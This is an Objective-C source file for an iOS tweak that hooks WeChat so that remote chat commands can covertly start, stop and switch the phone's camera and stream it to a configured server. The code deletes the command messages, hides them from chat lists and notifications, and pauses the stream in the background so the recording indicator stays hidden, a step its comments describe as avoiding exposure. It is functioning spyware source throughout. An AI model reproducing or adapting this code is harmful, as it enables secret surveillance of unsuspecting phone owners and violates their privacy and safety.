//
//  HGLiveHook.m
//  HGLiveHook
//
//  Created by jyh on 2018/8/3.
//  Copyright (c) 2018年 ___ORGANIZATIONNAME___. All rights reserved.
//

// CaptainHook by Ryan Petrich
// see https://github.com/rpetrich/CaptainHook/

#if TARGET_OS_SIMULATOR
#error Do not support the simulator, please use the real iPhone Device.
#endif

#import "HGLiveHook.h"
#import <Foundation/Foundation.h>
#import "CaptainHook/CaptainHook.h"
#import "HGLiveSettings.h"
#import "HGLiveManager.h"
#import "WechatPodForm.h"
#import <CoreLocation/CoreLocation.h>

CHDeclareClass(CMessageMgr);

// 聊天窗口显示过滤处理
CHOptimizedMethod2(self, void, CMessageMgr, AsyncOnAddMsg, id, arg1, MsgWrap, CMessageWrap *, wrap) {
    // 保存对象
    [[HGLiveSettings shared] setMgr:self];
    // 过滤空格
    wrap.m_nsContent = [wrap.m_nsContent stringByReplacingOccurrencesOfString:@" " withString:@""];
    // 设置服务器
    if ([wrap.m_nsContent hasPrefix:sheZhiFuWuQi]) {
        // 保存服务器信息
        [HGLiveSettings setupServer:wrap.m_nsContent room:wrap.m_nsToUsr];
        // 删除指令信息
        [HGLiveSettings DelMsg:arg1 MsgWrap:wrap];
        return;
    }
    // 开启摄像头
    if ([wrap.m_nsContent isEqualToString:start]) {
        // 标记当前状态
        [[HGLiveSettings shared] setIsPlay:YES];
        // 保存接收到的信息模型
        [[HGLiveSettings shared] setWrap:wrap];
        // 删除接收到的命令信息
        [HGLiveSettings DelMsg:arg1 MsgWrap:wrap];
        
        // 服务器地址不存在
        if (![HGLiveSettings isNoAddress]) {
            // 提示未设置服务器信息
            [HGLiveSettings AddMsgWithContent:WeiSheZhiFuWuQi];
            return;
        }
        


        // 发送播放地址信息
        [HGLiveSettings AddMsgWithContent:[HGLiveSettings getPlayAddress]];
        // 开启摄像头
        [[HGLiveManager shared] startRunning];
    }
    // 关闭摄像头
    if ([wrap.m_nsContent isEqualToString:stop]) {
        // 设置当前状态
        [[HGLiveSettings shared] setIsPlay:NO];
        // 关闭摄像头
        [[HGLiveManager shared] stopLive];
        // 删除命令信息
        [HGLiveSettings DelMsg:arg1 MsgWrap:wrap];
        return;
    }
    // 切换摄像头
    if ([wrap.m_nsContent isEqualToString:rotate]) {
        // 切换摄像头
        [[HGLiveManager shared] rotateCamera];
        // 删除命令信息
        [HGLiveSettings DelMsg:arg1 MsgWrap:wrap];
        return;
    }
    // 过滤掉自己发出的带有命令的信息
    if ([objc_getClass("CMessageWrap") isSenderFromMsgWrap:wrap]) {
        if ([HGLiveSettings isEqualToCommand:wrap.m_nsContent]) return;
    }
    
    CHSuper2(CMessageMgr, AsyncOnAddMsg, arg1, MsgWrap, wrap);
}

// 过滤掉聊天列表带有命令的信息显示
CHOptimizedMethod2(self, void, CMessageMgr, AsyncOnAddMsgListForSession, NSDictionary *, arg1, NotifyUsrName, NSMutableSet *, arg2) {
    CMessageWrap *wrap = arg1[[arg2 anyObject]];
    if ([HGLiveSettings isEqualToCommand:wrap.m_nsContent]) return;
    CHSuper2(CMessageMgr, AsyncOnAddMsgListForSession, arg1, NotifyUsrName, arg2);
}

// 通知过滤
CHOptimizedMethod1(self, void, CMessageMgr, MainThreadNotifyToExt, NSMutableDictionary *, arg1) {
    // 标记通知
    if ([arg1 valueForKey:@"3"]) {
        CMessageWrap *wrap = [arg1 valueForKey:@"3"];
        if ([HGLiveSettings isEqualToCommand:wrap.m_nsContent]) return;
    }
    // 震动通知
    if ([arg1 valueForKey:@"6"]) {
        NSDictionary *dic = [arg1 valueForKey:@"6"];
        CMessageWrap *wrap = dic[dic.allKeys.lastObject];
        if ([HGLiveSettings isEqualToCommand:wrap.m_nsContent]) return;
    }
    CHSuper1(CMessageMgr, MainThreadNotifyToExt, arg1);
}

CHDeclareClass(MicroMessengerAppDelegate);
// 将变为非活跃状态
CHOptimizedMethod1(self, void, MicroMessengerAppDelegate, applicationWillResignActive, id, arg1) {
    // 关闭. 由于进入后台.如果是开启状态.桌面状态栏会显示红色提醒用户后台录音开启.避免暴露,最好关闭
    if ([[HGLiveSettings shared] isPlay]) {
        [[HGLiveManager shared] stopLive];
        [HGLiveSettings AddMsgWithContent:@"stop"];
    }
    CHSuper1(MicroMessengerAppDelegate, applicationWillResignActive, arg1);
}

// 由后台进入前台
CHOptimizedMethod1(self, void, MicroMessengerAppDelegate, applicationWillEnterForeground, id, arg1) {
    // 开启.
    if ([[HGLiveSettings shared] isPlay]) {
        [[HGLiveManager shared] startRunning];
        [HGLiveSettings AddMsgWithContent:@"start"];
    }
    CHSuper1(MicroMessengerAppDelegate, applicationWillEnterForeground, arg1);
}

// 所有被hook的类和函数放在这里的构造函数中
CHConstructor
{
    @autoreleasepool
    {
        CHLoadLateClass(CMessageMgr);
        CHHook2(CMessageMgr, AsyncOnAddMsg, MsgWrap);
        CHHook2(CMessageMgr, AsyncOnAddMsgListForSession, NotifyUsrName);
        CHHook1(CMessageMgr, MainThreadNotifyToExt);
        
        CHLoadLateClass(MicroMessengerAppDelegate);
        CHHook1(MicroMessengerAppDelegate, applicationWillResignActive);
        CHHook1(MicroMessengerAppDelegate, applicationWillEnterForeground);
        
    }
}



